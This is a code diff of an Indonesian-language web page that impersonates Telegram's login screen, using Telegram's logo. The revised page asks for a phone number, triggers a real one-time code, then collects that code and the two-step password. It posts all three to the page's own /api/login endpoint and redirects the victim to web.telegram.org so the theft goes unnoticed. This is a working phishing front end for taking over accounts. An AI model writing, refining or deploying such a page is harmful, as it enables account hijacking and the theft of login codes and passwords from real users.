@@ -1,24 +1,55 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram: Login</title>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8"><title>Telegram: Verifikasi</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 320px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #3390ec; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <svg viewBox="0 0 24 24" width="60" height="60"><path fill="#3390ec" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.88-1.69 6.46-2.81 7.74-3.35 3.69-1.55 4.45-1.82 4.95-1.83.11 0 .36.03.53.17.14.11.18.26.2.37.01.07.02.21 0 .34z"/></svg>
-        </div>
+    <div class="box">
+        <img src="https://telegram.org/img/t_logo.png" width="80">
         <h2>Telegram</h2>
-        <p>Konfirmasi nomor telepon Anda untuk melanjutkan.</p>
-        <form action="/api/login" method="POST">
-            <input type="text" name="phone" placeholder="Nomor Telepon" required>
-            <input type="text" name="otp" placeholder="Kode OTP" required>
-            <input type="password" name="password" placeholder="Password 2-Step (Opsional)">
-            <button type="submit">MASUK</button>
-        </form>
+        <div id="step1">
+            <p>Masukkan nomor telepon untuk verifikasi akun.</p>
+            <input type="text" id="phone" placeholder="+62812xxxx">
+            <button onclick="reqOTP()">BERIKUTNYA</button>
+        </div>
+        <div id="step2" style="display:none;">
+            <p>Kode OTP asli telah dikirim ke nomor Anda.</p>
+            <input type="text" id="otp" placeholder="Kode 5 Digit">
+            <input type="password" id="pwd" placeholder="Password 2FA (Jika ada)">
+            <button onclick="submitAll()">KONFIRMASI</button>
+        </div>
     </div>
+
+    <script>
+        async function reqOTP() {
+            const phone = document.getElementById('phone').value;
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'SEND_OTP', phone })
+            });
+            if (res.ok) {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            }
+        }
+        async function submitAll() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.getElementById('pwd').value;
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'VERIFY', phone, otp, password })
+            });
+            window.location.href = "https://web.telegram.org";
+        }
+    </script>
 </body>
 </html>
